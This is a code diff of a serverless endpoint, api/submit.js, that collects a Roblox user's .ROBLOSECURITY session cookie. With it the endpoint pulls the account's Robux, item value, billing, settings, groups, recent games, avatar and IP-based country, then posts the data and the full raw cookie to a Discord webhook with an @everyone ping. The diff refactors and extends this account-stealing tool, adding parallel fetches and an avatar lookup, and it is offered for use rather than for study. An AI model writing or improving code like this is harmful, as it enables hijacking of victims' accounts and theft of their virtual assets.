@@ -1,7 +1,7 @@
 // api/submit.js
 const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
 
-// ---------- Real data fetches ----------
+// ---------- Helper functions ----------
 async function getUser(userId, cookie) {
   const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
     headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
@@ -46,7 +46,9 @@ async function getRapAndOwned(userId, cookie) {
         totalRap += json.RecentAveragePrice || 0;
       }
       await new Promise(r => setTimeout(r, 30));
-    } catch (e) {}
+    } catch (e) {
+      console.warn(`RAP fetch failed for ${asset.assetId}:`, e.message);
+    }
   }
   return { rap: totalRap, owned: allAssets.length };
 }
@@ -105,27 +107,32 @@ async function getGroups(userId, cookie) {
 }
 
 async function getCollectibles() {
-  // Placeholder – you can replace with actual rare items check
   return ["False", "False", "False"];
 }
 
-// ---------- Get last played games (real check) ----------
-async function getLastPlayedGames(userId, cookie) {
-  const targetGames = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
-  // Fetch recently played games (uses internal Roblox API)
-  const res = await fetch(`https://games.roblox.com/v1/users/${userId}/games?sortOrder=Desc&limit=50`, {
+// ----- Recently Played Games (real API) -----
+async function getRecentlyPlayedGames(userId, cookie) {
+  // Official Roblox endpoint for recent games (requires no extra auth)
+  const url = `https://games.roblox.com/v1/users/${userId}/recent-games?limit=50`;
+  const res = await fetch(url, {
     headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
   });
-  if (!res.ok) return targetGames.map(name => ({ name, played: "False", passes: 0 }));
+  if (!res.ok) return [];
+
   const data = await res.json();
-  const playedGameNames = (data.data || []).map(g => g.name);
+  return (data.data || []).map(game => game.name);
+}
+
+async function getPlayedPasses(userId, cookie) {
+  const targetGames = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
+  const recentGames = await getRecentlyPlayedGames(userId, cookie);
   return targetGames.map(name => {
-    const played = playedGameNames.some(g => g.toLowerCase().includes(name.toLowerCase())) ? "True" : "False";
-    return { name, played, passes: 0 };
+    const played = recentGames.some(g => g.toLowerCase().includes(name.toLowerCase()));
+    return { name, played: played ? "True" : "False", passes: 0 };
   });
 }
 
-// ---------- Country flag from IP ----------
+// ----- Country flag (unicode) -----
 async function getCountryFlag(req) {
   const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
   if (!ip || ip === '::1') return '🏠 Local';
@@ -133,12 +140,30 @@ async function getCountryFlag(req) {
     const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode`);
     const data = await geoRes.json();
     if (data.status === 'success' && data.countryCode) {
-      const code = data.countryCode.toLowerCase();
-      const flag = String.fromCodePoint(...[...code].map(c => 0x1F1E6 - 65 + c.charCodeAt(0)));
-      return `${flag} ${data.countryCode}`;
+      const code = data.countryCode;
+      // Convert country code to unicode flag emoji (e.g., US -> 🇺🇸)
+      const flag = code.split('').map(letter =>
+        String.fromCodePoint(letter.charCodeAt(0) + 127397)
+      ).join('');
+      return `${flag} ${code}`;
     }
   } catch (e) {}
   return '🌍 Unknown';
+}
+
+// ----- Avatar image URL -----
+async function getUserAvatarUrl(userId, cookie) {
+  try {
+    const res = await fetch(
+      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`,
+      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } }
+    );
+    if (!res.ok) return null;
+    const data = await res.json();
+    return data.data?.[0]?.imageUrl || null;
+  } catch (e) {
+    return null;
+  }
 }
 
 // ---------- MAIN HANDLER ----------
@@ -152,32 +177,34 @@ export default async function handler(req, res) {
   if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });
 
   try {
-    // Fetch all data
-    const userData = await getUser(rbxuid, cookie);
-    const robux = await getRobux(rbxuid, cookie);
-    const rapData = await getRapAndOwned(rbxuid, cookie);
-    const billing = await getBilling(cookie);
-    const settings = await getSettings(cookie);
-    const groups = await getGroups(rbxuid, cookie);
-    const playedPasses = await getLastPlayedGames(rbxuid, cookie); // dynamic check
-    const collectibles = await getCollectibles();
-    const countryFlag = await getCountryFlag(req);
+    // Parallel fetch
+    const [userData, robux, rapData, billing, settings, groups, playedPasses, collectibles, countryFlag, avatarUrl] = await Promise.all([
+      getUser(rbxuid, cookie),
+      getRobux(rbxuid, cookie),
+      getRapAndOwned(rbxuid, cookie),
+      getBilling(cookie),
+      getSettings(cookie),
+      getGroups(rbxuid, cookie),
+      getPlayedPasses(rbxuid, cookie),
+      getCollectibles(),
+      getCountryFlag(req),
+      getUserAvatarUrl(rbxuid, cookie)
+    ]);
 
     const accountAge = getAgeDays(userData.created);
     const summary = robux.balance + rapData.rap;
     const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
-
-    // Emojis & images
-    const robuxEmoji = "<:Robux:1495081542370726080>"; // new Robux emoji
+    const rolimonsLink = `https://www.rolimons.com/player/${userData.id}`;
     const cookieThumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
-    const rolimonsLink = `https://www.rolimons.com/user/${userData.id}`;
+    const robuxEmoji = "<:Robux:1495081542370726080>"; // make sure this emoji exists in your webhook's server
 
-    // ---------- Stats Embed (dark blue, all bold, @everyone ping) ----------
+    // Embed 1: Stats (with avatar as image)
     const statsEmbed = {
       title: "🔱 Vyro Har - Result",
       description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
-      color: 0x1E3A8A, // dark blue
+      color: 0x1E3A8A,
       thumbnail: { url: cookieThumb },
+      image: avatarUrl ? { url: avatarUrl } : undefined,  // shows avatar below fields
       fields: [
         {
           name: "📌 About User",
@@ -234,7 +261,7 @@ export default async function handler(req, res) {
       timestamp: new Date().toISOString()
     };
 
-    // ---------- Cookie Embed (bold+italic title, no warning, cookie thumbnail) ----------
+    // Embed 2: Cookie (bold+italic title, no warning)
     const cookieEmbed = {
       title: "🍪 ***.ROBLOSECURITY***",
       description: `**Full Roblox Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
@@ -244,7 +271,7 @@ export default async function handler(req, res) {
       timestamp: new Date().toISOString()
     };
 
-    // Send first embed with @everyone ping
+    // Send stats embed with @everyone ping
     await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -255,7 +282,7 @@ export default async function handler(req, res) {
       })
     });
 
-    // Send second embed (cookie)
+    // Send cookie embed
     await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
